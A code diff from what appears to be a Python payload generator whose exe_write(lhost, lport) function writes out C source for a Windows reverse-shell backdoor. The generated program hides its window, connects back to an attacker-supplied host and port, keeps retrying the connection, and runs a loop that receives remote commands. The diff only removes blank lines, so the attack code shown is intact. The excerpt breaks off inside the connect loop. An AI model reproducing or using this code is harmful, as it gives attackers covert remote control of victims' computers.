@@ -134,11 +134,8 @@ def exe_write(lhost,lport):
     f.write("#include <string.h>\n")
     f.write("#include <sys/stat.h>\n")
     f.write("#include <sys/types.h>\n\n")
-
     f.write("#define bzero(p, size) (void)memset((p), 0, (size))\n\n")
-
     f.write("int sock;\n\n")
-
     f.write("void Shell()\n")
     f.write("{\n")
     f.write("char buffer[1024];\n")
@@ -151,7 +148,6 @@ def exe_write(lhost,lport):
     f.write("bzero(container, sizeof(container));\n")
     f.write("bzero(total_response, sizeof(total_response));\n")
     f.write("recv(sock, buffer, sizeof(buffer), 0);\n")
-
     f.write("if (strncmp(\"q\", buffer, 1) == 0)\n")
     f.write("{\n")
     f.write("closesocket(sock);\n")
@@ -171,7 +167,6 @@ def exe_write(lhost,lport):
     f.write("}\n")
     f.write("}\n")
     f.write("}\n\n")
-
     f.write("int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)\n")
     f.write("{\n")
     f.write("HWND stealth;\n")
@@ -188,13 +183,11 @@ def exe_write(lhost,lport):
     f.write("{\n")
     f.write("exit(1);\n")
     f.write("}\n\n")
-
     f.write("sock = socket(AF_INET, SOCK_STREAM, 0);\n")
     f.write("memset(&ServAddr, 0, sizeof(ServAddr));\n")
     f.write("ServAddr.sin_family = AF_INET;\n")
     f.write("ServAddr.sin_addr.s_addr = inet_addr(ServIP);\n")
     f.write("ServAddr.sin_port = htons(ServPort);\n\n")
-
     f.write("start:\n")
     f.write("while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)\n")
     f.write("{\n")
